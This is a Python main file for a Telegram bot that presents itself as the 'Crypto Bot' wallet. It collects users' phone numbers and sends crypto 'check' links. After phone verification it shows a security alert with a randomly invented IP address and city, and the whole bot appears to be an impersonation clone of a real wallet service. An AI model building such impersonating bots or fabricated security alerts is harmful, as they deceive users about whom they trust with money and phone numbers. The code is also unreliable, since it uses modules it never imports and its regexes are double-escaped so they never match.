# main.py
import asyncio
import logging
import os
import random
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, 
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, 
    InlineKeyboardMarkup, InlineKeyboardButton,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent, ChosenInlineResult, LinkPreviewOptions
)
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

import config
from config import BOT_TOKEN, _e
from database import init_db, create_user, get_user, save_phone
from keyboards import main_menu_inline

import wallet
import p2p
import more
import admin
import business
import notifications
import limits
import currency
import menu_stubs
import settings_actions
import extra_menus
import exchange

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Подключаем роутеры
dp.include_router(extra_menus.router)
dp.include_router(exchange.router)
dp.include_router(admin.router)
dp.include_router(wallet.router)
dp.include_router(p2p.router)
dp.include_router(notifications.router)
dp.include_router(limits.router)
dp.include_router(currency.router)
dp.include_router(more.router)
dp.include_router(settings_actions.router)
dp.include_router(menu_stubs.router)
dp.include_router(business.router)

class Onboarding(StatesGroup):
    waiting_start = State()
    waiting_contact = State()

def get_start_text() -> str:
    crypto_icon = _e("crypto", "💼")
    leaf = _e("leaf", "🍂")
    
    # БЕЗ ССЫЛОК НА TELEGRAM-КАНАЛЫ
    return (
        f"{crypto_icon} <b>Мультивалютный криптокошелёк</b>. "
        "Покупайте, продавайте, храните, "
        "отправляйте криптовалюту и платите ею, когда хотите.\n\n"
        "Подписывайтесь на наш канал "
        "и вступайте в наш чат.\n\n"
        f"{leaf} Осенний фестиваль с {crypto_icon} Crypto Bot! "
        "Получить баллы ›"
    )

@dp.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    if msg.text and "check_" in msg.text:
        await more.activate_check_link(msg, state)
        return

    if msg.text and "invoice_" in msg.text:
        await extra_menus.show_invoice_card(msg, state)
        return

    await state.clear()
    await create_user(msg.from_user.id, msg.from_user.username or "")
    user = await get_user(msg.from_user.id)

    if user and user["is_onboarded"]:
        img_path = os.path.join(BASE_DIR, "start_banner.jpg")
        from database import get_all_balances
        from keyboards import update_user_chat_menu_button
        balances = await get_all_balances(msg.from_user.id)
        await update_user_chat_menu_button(msg.bot, msg.from_user.id, balances)
        kb = main_menu_inline(user_id=msg.from_user.id, balances=balances)
        text = get_start_text()
        if os.path.exists(img_path):
            await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
        else:
            await msg.answer(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
        return

    img_path = os.path.join(BASE_DIR, "welcome.jpg")
    text = (
        '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
        "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Начать", callback_data="onb:start")]
    ])
    
    if os.path.exists(img_path):
        await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML")
    else:
        await msg.answer(text, reply_markup=kb, parse_mode="HTML")
    
    await state.set_state(Onboarding.waiting_start)

@dp.callback_query(Onboarding.waiting_start, F.data == "onb:start")
async def onb_start(cb: CallbackQuery, state: FSMContext):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Поделиться номером", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await cb.message.answer("Подтвердите номер телефона, нажав на кнопку ниже.", reply_markup=kb)
    await state.set_state(Onboarding.waiting_contact)
    await cb.answer()

@dp.message(Onboarding.waiting_contact, F.contact)
async def onb_contact(msg: Message, state: FSMContext):
    contact = msg.contact
    if contact.user_id != msg.from_user.id:
        await msg.answer("Пожалуйста, отправьте свой собственный номер.")
        return

    await save_phone(msg.from_user.id, contact.phone_number)
    await msg.answer("✅ Вы успешно подтвердили номер телефона.", reply_markup=ReplyKeyboardRemove())
    
    fake_ip = f"31.59.{random.randint(100, 200)}.{random.randint(10, 99)}"
    fake_city = random.choice(["Warsaw, Poland", "Berlin, Germany", "London, UK", "Paris, France"])
    
    text_security = (
        f"⚠️ Вы создали код-пароль\n\n"
        f"IP-адрес: <code>{fake_ip}</code>\n"
        f"Локация: {fake_city}\n\n"
        f"Если это были не вы, напишите в поддержку – @CryptoSupportBot."
    )
    await msg.answer(text_security, parse_mode="HTML")
    
    text_final = (
        'Настройка аккаунта успешно завершена. Теперь вы можете использовать '
        'все возможности <tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> Crypto Bot.'
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Начать", callback_data="menu:main")]
    ])
    await msg.answer(text_final, reply_markup=kb, parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "menu:main")
async def cb_main_menu(cb: CallbackQuery):
    img_path = os.path.join(BASE_DIR, "start_banner.jpg")
    text = get_start_text()
    try: await cb.message.delete()
    except: pass
    
    from database import get_all_balances
    balances = await get_all_balances(cb.from_user.id)
    kb = main_menu_inline(user_id=cb.from_user.id, balances=balances)

    if os.path.exists(img_path):
        await cb.message.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
    else:
        await cb.message.answer(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
    await cb.answer()

# --- ОБРАБОТЧИКИ КОМАНД ДЛЯ СИНЕГО МЕНЮ ---

@dp.message(Command("wallet"))
async def cmd_wallet(msg: Message):
    await wallet.show_wallet(msg, msg.from_user.id, edit=False)

@dp.message(Command("exchange"))
async def cmd_exchange(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:exchange")
    await exchange.cb_exchange_menu(fake_cb)

@dp.message(Command("swap"))
async def cmd_swap(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:swap")
    await more.cb_swap_menu(fake_cb)

@dp.message(Command("p2p"))
async def cmd_p2p(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:p2p")
    await p2p.cb_p2p_menu(fake_cb)

@dp.message(Command("checks"))
async def cmd_checks(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:checks")
    await more.cb_checks(fake_cb)

@dp.message(Command("invoices"))
async def cmd_invoices(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:invoices")
    await extra_menus.cb_invoices(fake_cb)

@dp.message(Command("giveaways"))
async def cmd_giveaways(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:giveaways")
    await extra_menus.cb_giveaways(fake_cb)

@dp.message(Command("subscriptions"))
async def cmd_subscriptions(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:subs")
    await extra_menus.cb_subs(fake_cb)

@dp.message(Command("pay"))
async def cmd_pay(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:pay")
    await more.cb_crypto_pay(fake_cb)

@dp.message(Command("settings"))
async def cmd_settings(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:settings")
    await menu_stubs.cb_menu_settings(fake_cb)


INLINE_CHECK_DRAFTS = {}

@dp.inline_query()
async def inline_query_handler(query: InlineQuery):
    q = (query.query or '').strip()
    uid = query.from_user.id
    bot_info = await query.bot.get_me()
    bot_username = bot_info.username or 'CryptoBot'

    from database import get_all_balances
    balances = await get_all_balances(uid)
    results = []

    m = re.match(r'^(\\d+(?:[.,]\\d+)?)\\s*([a-zA-Z]+)(?:\\s+(.+))?$', q)
    password = None
    if not m:
        m2 = re.match(r'^([a-zA-Z]+)\\s*(\\d+(?:[.,]\\d+)?)(?:\\s+(.+))?$', q)
        if m2:
            asset_str = m2.group(1).upper()
            amount_val = float(m2.group(2).replace(',', '.'))
            password = m2.group(3).strip() if m2.group(3) else None
        else:
            asset_str = None
            amount_val = None
    else:
        amount_val = float(m.group(1).replace(',', '.'))
        asset_str = m.group(2).upper()
        password = m.group(3).strip() if m.group(3) else None

    ASSET_PRICES = {
        'USDT': 1.0, 'GRAM': 1.341, 'TON': 1.60, 'BTC': 80669.86,
        'ETH': 2354.81, 'SOL': 101.0, 'TRX': 0.3295, 'DOGE': 0.07709,
        'LTC': 57.15, 'BNB': 741.27, 'USDC': 1.0, 'XAUT': 2121.1
    }

    if asset_str and amount_val and amount_val > 0:
        asset = asset_str
        cur_bal = balances.get(asset, 0.0)
        if cur_bal >= amount_val:
            cid = secrets.token_hex(4)
            INLINE_CHECK_DRAFTS[cid] = {
                'user_id': uid,
                'amount': amount_val,
                'asset': asset,
                'password': password,
                'time': time.time()
            }
            deep_link = f'https://t.me/{bot_username}?start=check_{cid}'
            price_usd = ASSET_PRICES.get(asset, 1.0)
            fiat_val = amount_val * price_usd
            img_url = f'https://imggen.cr.bot/checks/image?asset={asset}&asset_amount={amount_val:g}&fiat=USD&fiat_amount={fiat_val:.2f}&main=asset&v5'

            kb = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text=f'Получить {amount_val:g} {asset}', url=deep_link)
            ]])

            # Нативное превью Telegram с медиа-рамкой и крупной картинкой
            content = InputTextMessageContent(
                message_text=f'Чек на <b>{amount_val:g} {asset}</b> (${fiat_val:.2f}).',
                parse_mode='HTML',
                link_preview_options=LinkPreviewOptions(
                    url=img_url,
                    prefer_large_media=True,
                    show_above_text=True
                )
            )
            results.append(InlineQueryResultArticle(
                id=f'chk_{cid}',
                title=f'Отправить чек на {amount_val:g} {asset}',
                description=f'Баланс: {cur_bal:g} {asset} (~${fiat_val:.2f})',
                input_message_content=content,
                reply_markup=kb,
                thumbnail_url=img_url
            ))
        else:
            content = InputTextMessageContent(
                message_text=f'❌ Недостаточно средств для отправки чека на {amount_val:g} {asset}.',
                parse_mode='HTML'
            )
            results.append(InlineQueryResultArticle(
                id='insufficient',
                title=f'❌ Недостаточно {asset}',
                description=f'Ваш баланс: {cur_bal:g} {asset}, требуется: {amount_val:g} {asset}',
                input_message_content=content
            ))
    else:
        for a, b in balances.items():
            if b > 0:
                cid = secrets.token_hex(4)
                INLINE_CHECK_DRAFTS[cid] = {
                    'user_id': uid,
                    'amount': b,
                    'asset': a,
                    'time': time.time()
                }
                deep_link = f'https://t.me/{bot_username}?start=check_{cid}'
                p_usd = ASSET_PRICES.get(a, 1.0)
                f_val = b * p_usd
                img_url = f'https://imggen.cr.bot/checks/image?asset={a}&asset_amount={b:g}&fiat=USD&fiat_amount={f_val:.2f}&main=asset&v5'

                kb = InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text=f'Получить {b:g} {a}', url=deep_link)
                ]])
                content = InputTextMessageContent(
                    message_text=f'Чек на <b>{b:g} {a}</b> (${f_val:.2f}).',
                    parse_mode='HTML',
                    link_preview_options=LinkPreviewOptions(
                        url=img_url,
                        prefer_large_media=True,
                        show_above_text=True
                    )
                )
                results.append(InlineQueryResultArticle(
                    id=f'chk_{cid}',
                    title=f'Отправить чек на {b:g} {a}',
                    description=f'Формат: @{bot_username} <сумма> <валюта>',
                    input_message_content=content,
                    reply_markup=kb,
                    thumbnail_url=img_url
                ))
        if not results:
            content = InputTextMessageContent(
                message_text=f'ℹ️ Чтобы отправить чек в чат, введите:\\n@{bot_username} <сумма> <валюта>\\n\\nНапример: @{bot_username} 10 USDT',
                parse_mode='HTML'
            )
            results.append(InlineQueryResultArticle(
                id='help',
                title='Отправить чек: @бот сумма валюта',
                description='Например: 10 USDT или 1.5 TON',
                input_message_content=content
            ))

    await query.answer(results=results, cache_time=1, is_personal=True)

@dp.chosen_inline_result()
async def chosen_inline_result_handler(chosen: ChosenInlineResult):
    res_id = chosen.result_id
    if res_id.startswith('chk_'):
        cid = res_id[4:]
        draft = INLINE_CHECK_DRAFTS.pop(cid, None)
        if draft:
            uid = draft['user_id']
            amount = draft['amount']
            asset = draft['asset']
            try:
                from database import create_check
                await create_check(
                    uid=uid,
                    asset=asset,
                    total=amount,
                    limit=1,
                    password=draft.get('password'),
                    inline_message_id=chosen.inline_message_id,
                    check_id=cid
                )
                log.info('Created inline check %s for user %d: %s %s (inline_msg=%s)', cid, uid, amount, asset, chosen.inline_message_id)
            except Exception as e:
                log.error('Failed to create inline check %s: %s', cid, e)

from keep_alive import start_health_server

async def main():
    port = start_health_server()
    log.info(f"Healthcheck сервер активен на порту {port}")
    await init_db()
    me = await bot.get_me()
    config.BOT_USERNAME = me.username
    log.info(f"Бот запущен: @{me.username}")
    
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())